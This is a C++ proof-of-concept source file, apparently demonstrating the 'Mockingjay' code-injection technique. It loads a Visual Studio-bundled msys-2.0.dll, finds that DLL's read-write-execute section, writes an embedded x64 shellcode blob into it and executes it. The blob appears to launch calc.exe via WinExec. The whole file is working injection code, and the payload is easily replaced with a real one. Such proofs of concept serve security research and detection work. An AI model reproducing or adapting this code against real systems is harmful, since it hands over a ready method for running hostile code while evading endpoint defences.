// mockingjay_poc.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
//

#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <dbghelp.h>


char SHELLCODE[] = "\x55\x48\x89\xE5\x48\x81\xEC\x90\x00\x00\x00\x48\x31\xC0\x65\x48\x8B\x04\x25\x30\x00\x00\x00\x48\x8B\x40\x60\x48\x8B\x40\x18\x48\x8B\x40\x20\x48\x8B\x00\x48\x8B\x00\x48\x8D\x40\xF0\x48\x8B\x40\x30\x48\x31\xDB\x8B\x58\x3C\x48\x01\xC3\x48\x81\xC3\x88\x00\x00\x00\x48\x31\xC9\x8B\x0B\x48\x01\xC1\x48\x89\x8D\x70\xFF\xFF\xFF\x48\x31\xD2\x8B\x51\x1C\x48\x01\xC2\x48\x89\x55\x90\x48\x31\xDB\x8B\x51\x20\x48\x01\xC2\x48\x89\x55\xA0\x48\x31\xC9\x48\x31\xD2\x51\x48\xB9\xFF\x57\x69\x6E\x45\x78\x65\x63\x48\xC1\xE9\x08\x51\x54\x48\x31\xC9\xB1\x07\x51\x41\x58\x41\x59\x4D\x31\xE4\x4C\x89\xC1\x4C\x89\xCE\x48\x8B\x55\xA0\x42\x8B\x14\xA2\x49\xFF\xC4\x4C\x8D\x1C\x02\x4C\x89\xDF\xF3\xA6\x75\xE4\x48\x83\xC4\x10\x49\xFF\xCC\x48\x31\xFF\x48\x31\xD2\xB2\x04\x48\x01\xD7\x50\x48\x89\xF8\x4C\x89\xE6\x48\xF7\xEE\x48\x89\xC6\x58\x48\x8B\x7D\x90\x48\x8D\x3C\x37\x8B\x3F\x48\x01\xC7\x48\xBB\x41\x41\x41\x41\x2E\x65\x78\x65\x48\xC1\xEB\x20\x53\x48\xBB\x6D\x33\x32\x5C\x63\x61\x6C\x63\x53\x48\xBB\x77\x73\x5C\x73\x79\x73\x74\x65\x53\x48\xBB\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x53\x54\x59\x48\xFF\xC2\x48\x83\xEC\x20\xFF\xD7";


struct SectionDescriptor {
    LPVOID start;
    LPVOID end;
};

DWORD_PTR FindRWXOffset(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                DWORD_PTR baseAddress = (DWORD_PTR)hModule;
                DWORD_PTR sectionOffset = sectionHeader->VirtualAddress;
                DWORD_PTR sectionSize = sectionHeader->SizeOfRawData;
                std::cout << "Base Adress : " <<std::hex<< baseAddress << std::endl;
                std::cout << "Section Offset : " << std::hex << sectionOffset << std::endl;
                std::cout << "Size of section : " << sectionSize << std::endl;
                return sectionOffset;
            }
            sectionHeader++;
        }
    }
    return 0;
}

DWORD_PTR FindRWXSize(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                DWORD_PTR sectionSize = sectionHeader->SizeOfRawData;
                std::cout << "Size of section : " << sectionSize << std::endl;
                return sectionSize;
            }
            sectionHeader++;
        }
    }
    return 0;
}

void WriteCodeToSection(LPVOID rwxSectionAddr, const char* shellcode, SIZE_T sizeShellcode) {
    memcpy((LPVOID)rwxSectionAddr, shellcode, sizeShellcode);
    std::cout << sizeShellcode <<" bytes of shellcode Written to RWX Memory Region\n";
}

void ExecuteCodeFromSection(LPVOID rwxSectionAddr) {
    //inline assembly execution
    ((void(*)())rwxSectionAddr)();
    std::cout << "Execution of shellcode Written to RWX Memory Region\n";
}

int main()
{
    std::cout << "Hello World!\n";
    // Load the vulnerable DLL
    HMODULE hDll = ::LoadLibraryW(L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll");

    if (hDll == nullptr) {
        // fail
        std::cout << "Fail to load the targeted DLL\n";
    }

    MODULEINFO moduleInfo;
    if (!::GetModuleInformation(
        ::GetCurrentProcess(),
        hDll,
        &moduleInfo,
        sizeof(MODULEINFO))
        ) {
        // fail
        std::cout << "Fail to get module info\n";
    }

    DWORD_PTR RWX_SECTION_OFFSET = FindRWXOffset(hDll);
    DWORD_PTR RWX_SECTION_SIZE = FindRWXSize(hDll);


    // Access the default RWX section (Vulnerable DLL address + offset)
    LPVOID rwxSectionAddr = (LPVOID)((PBYTE)moduleInfo.lpBaseOfDll + RWX_SECTION_OFFSET);
    std::cout << "Adress of RWX Section : " << rwxSectionAddr << std::endl;
    
    SectionDescriptor descriptor = SectionDescriptor{
        rwxSectionAddr,(LPVOID)((PBYTE)rwxSectionAddr + RWX_SECTION_SIZE)

    };
    std::cout << "RWX section starts at " << descriptor.start << " and ends at " << descriptor.end << std::endl;;

    SIZE_T shellcodesize = sizeof(SHELLCODE);
    // Write the injected code to the RWX section
    WriteCodeToSection(rwxSectionAddr, SHELLCODE, shellcodesize);
    
    // Execute the injected code
    ExecuteCodeFromSection(rwxSectionAddr);

    return 0;
}


